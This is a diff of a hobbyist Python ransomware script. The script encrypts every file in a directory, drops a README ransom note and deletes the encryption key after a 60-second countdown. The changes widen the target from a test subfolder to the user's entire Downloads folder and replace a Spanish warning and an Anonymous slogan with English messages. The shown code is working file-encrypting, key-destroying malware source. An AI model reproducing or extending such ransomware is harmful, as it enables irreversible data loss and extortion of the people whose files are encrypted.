@@ -22,7 +22,7 @@ def encrypt(items,key):
             file.write(encrypted_data)
 
 if __name__ == '__main__':    
-    path_to_encrypt = '/home/anon23/Descargas/RansomWare/Files/'
+    path_to_encrypt = '/home/anon23/Descargas/'
     items = os.listdir(path_to_encrypt)
     full_path = [path_to_encrypt + '/' + item for item in items]
     generar_key()
@@ -30,17 +30,17 @@ if __name__ == '__main__':
     encrypt(full_path,key)
 
     with open(path_to_encrypt+'/README.txt','w') as file:
-        file.write('We are Anonymous, we are legion,\n')
-        file.write('we do not forgive, we do not forget. Expect us.')
+        file.write('Encrypted,\n')
+        
     
     segundos = 0
     while segundos<=60:
         start = time.time()  
         print(str(segundos))   
-        print('Tiene 60 segundos para guardar su llave, esta será eliminada')
+        print('You have 60 seconds for save your key')
         end = time.time()
         segundos = segundos + (end-start)
-    path_key = '/home/anon23/Descargas/RansomWare'
+    path_key = '/home/anon23/Descargas/'
     if os.path.exists(path_key + '/key.txt'):
         os.remove(path_key + '/key.txt')
     
